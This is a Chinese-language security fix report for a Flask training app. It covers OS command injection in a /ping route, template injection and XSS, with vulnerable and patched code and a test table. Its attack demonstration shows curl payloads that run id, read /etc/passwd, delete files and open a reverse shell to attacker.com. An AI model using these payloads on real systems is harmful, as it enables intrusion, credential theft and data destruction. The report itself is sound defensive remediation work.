# 🛡️ 漏洞修复报告（第五批）

> **项目**: Flask 用户信息管理平台
> **项目路径**: `/opt/Class01/`
> **GitHub**: https://github.com/kittyoo0805/-2026

---

## 修复的漏洞：3 个

| # | 漏洞类型 | 漏洞名称 | 严重程度 | 位置 |
|:-|---------|---------|:--------:|:----:|
| ① | 💀 **Shell 注入** | Ping 命令注入（OS 命令注入） | 🔴 **严重** | `POST /ping` |
| ② | 🟣 **SSTI** | 反馈页 GET 模板注入残留 | 🟠 **高危** | `GET /feedback` |
| ③ | 🟡 **XSS** | 三个页面的跨站脚本 | 🟠 **高危** | `/welcome`、`/feedback` |

---

## 漏洞①：Shell 注入（OS 命令注入）

| 项目 | 内容 |
|:----|------|
| **路由** | `POST /ping` |
| **漏洞类型** | OS 命令注入（Shell 注入） |
| **CWE 编号** | CWE-78 |
| **行号** | 第 731 行 |

### 漏洞代码（修复前）

```python
@app.route("/ping", methods=["POST"])
def ping():
    ip = request.form.get("ip", "")          # 直接从表单获取用户输入
    cmd = f"ping -c 3 {ip}"                  # ❌ f-string 拼接到系统命令
    result = subprocess.check_output(cmd, shell=True, timeout=30)  # ❌ shell=True
    return render_template("ping.html", result=result)
```

### 漏洞原理

| 漏洞要素 | 说明 |
|---------|------|
| `f"ping -c 3 {ip}"` | 用户输入直接拼接到系统命令字符串中 |
| `shell=True` | 将命令交给系统 Shell 执行，支持 `;`、`\|`、`&&` 等拼接 |
| `check_output()` | 执行结果返回给用户，有回显，攻击者可直接看到输出 |

**三要素齐备**：用户控制输入 + shell 执行 + 结果回显 = **最危险的命令注入**。

### 攻击演示

```bash
# 查看当前用户（验证命令注入成功）
curl -X POST /ping -d "ip=127.0.0.1;id"
# 输出：uid=0(root) gid=0(root) ← 服务器信息泄露

# 读取系统文件
curl -X POST /ping -d "ip=127.0.0.1;cat /etc/passwd"

# 建立反弹 Shell（完全控制服务器）
curl -X POST /ping -d "ip=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# 删除文件（破坏系统）
curl -X POST /ping -d "ip=127.0.0.1;rm -rf /tmp/*"
```

### 修复方式

```python
# 修复前
ip = request.form.get("ip", "")
cmd = f"ping -c 3 {ip}"                            # f-string 拼接
result = subprocess.check_output(cmd, shell=True)    # shell=True

# 修复后
import re
ip = request.form.get("ip", "").strip()
if not re.match(r'^[a-zA-Z0-9.\-_:]+$', ip):       # 白名单校验
    result = "无效的 IP 地址或域名格式"
else:
    cmd = ["ping", "-c", "3", ip]                   # 参数列表方式
    result = subprocess.check_output(cmd, timeout=30)  # 无 shell=True
```

### 修复原理

| 修复措施 | 防御原理 |
|---------|---------|
| **正则校验 `^[a-zA-Z0-9.\-_:]+$`** | 只允许字母、数字、点、横线、下划线、冒号，拦截 `;`、`\|`、`&&`、`$()` 等 Shell 特殊字符 |
| **参数列表 `["ping", "-c", "3", ip]`** | subprocess 直接将参数传给程序，不经过 Shell 解析，`;id` 被当作 ping 的参数而非命令分隔符 |
| **去除 `shell=True`** | 禁止通过 Shell 执行命令，`;`、`\|` 等不再是 Shell 语法符号 |

---

## 漏洞②：SSTI（反馈页 GET）

| 项目 | 内容 |
|:----|------|
| **路由** | `GET /feedback` |
| **漏洞类型** | 服务端模板注入（SSTI） |
| **行号** | 第 687 行 |

### 漏洞代码（修复前）

```python
html = f'''<!DOCTYPE html>
...
    {nav}                          # ❌ f-string 拼接字符串到模板
...
</html>'''
return render_template_string(html)  # 模板引擎执行
```

虽然 `nav` 不包含用户输入（目前安全），但使用 `f-string` + `render_template_string()` 的模式本身就存在风险——如果后续代码在 `nav` 中加入用户数据，会立即引入 SSTI。

### 修复方式

```python
# 修复前
html = f'''...{nav}...'''
return render_template_string(html)

# 修复后
html = '''...{{ nav }}...'''
return render_template_string(html, nav=nav)
```

---

## 漏洞③：XSS 跨站脚本

| 项目 | 内容 |
|:----|------|
| **涉及路由** | `/welcome`、`/feedback POST` |
| **漏洞类型** | 跨站脚本（XSS） |
| **修复情况** | 已在第四批修复报告中修复，本批次无需额外操作 |

已在第四批修复中完成：将 f-string 拼接改为 Jinja2 变量传递，Jinja2 自动转义 HTML 特殊字符。

---

## 修复后完整代码

### `/ping` 修复后完整代码

```python
@app.route("/ping", methods=["GET", "POST"])
def ping():
    if "username" not in session:
        return redirect(url_for("login"))

    result = ""
    ip = ""

    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        # 修复 Shell 注入：验证 IP 地址或域名格式
        import re
        if not re.match(r'^[a-zA-Z0-9.\-_:]+$', ip):
            result = "无效的 IP 地址或域名格式"
        else:
            try:
                # 使用参数列表而非 shell=True，防止命令注入
                cmd = ["ping", "-c", "3", ip]
                result = subprocess.check_output(cmd, timeout=30, stderr=subprocess.STDOUT).decode("utf-8", errors="replace")
            except subprocess.CalledProcessError as e:
                result = e.output.decode("utf-8", errors="replace") if e.output else "Ping 失败"
            except subprocess.TimeoutExpired:
                result = "Ping 请求超时"
            except Exception as e:
                result = f"执行出错: {e}"

    return render_template("ping.html", result=result, ip=ip)
```

---

## 验证结果

| 测试项 | 漏洞类型 | 修复前 | 修复后 |
|:------|---------|:------:|:------:|
| `ip=127.0.0.1;id` | Shell 注入 | ✅ 输出 uid=0(root) | ❌ "无效的 IP 地址" |
| `ip=127.0.0.1\|whoami` | Shell 注入 | ✅ 执行命令 | ❌ "无效的 IP 地址" |
| `ip=127.0.0.1$(whoami)` | Shell 注入 | ✅ 执行命令 | ❌ "无效的 IP 地址" |
| `ip=127.0.0.1`（正常） | 正常功能 | ✅ Ping 成功 | ✅ Ping 成功 |
| `ip=baidu.com`（域名） | 正常功能 | ✅ Ping 成功 | ✅ Ping 成功 |
| 反馈页 `{{config}}` GET | SSTI | ✅ f-string 拼接 | ❌ Jinja2 变量传递 |
| `{{7*7}}` 欢迎页 | SSTI | ✅ 输出 49 | ❌ 显示文本（第四批已修） |
| `<script>` 欢迎页 | XSS | ✅ 执行脚本 | ❌ 转义文本（第四批已修） |

---

## 漏洞修复方法总结

| 漏洞类型 | 核心修复方法 | 防御原理 |
|---------|------------|---------|
| **Shell 注入** | 正则白名单 + 参数列表 + 禁用 shell=True | 让用户输入无法成为 Shell 语法的一部分 |
| **SSTI** | f-string 拼接 → Jinja2 变量传递 | 用户数据作为纯文本传给模板引擎，不被解析为模板语法 |
| **XSS** | Jinja2 自动转义（移除 f-string） | HTML 特殊字符 `<>"'` 自动转义为字符实体 |

## 修改文件

| 文件 | 修改内容 |
|:----|---------|
| `app.py` | `/ping` 路由修复 Shell 注入；`/feedback` GET 修复 SSTI |
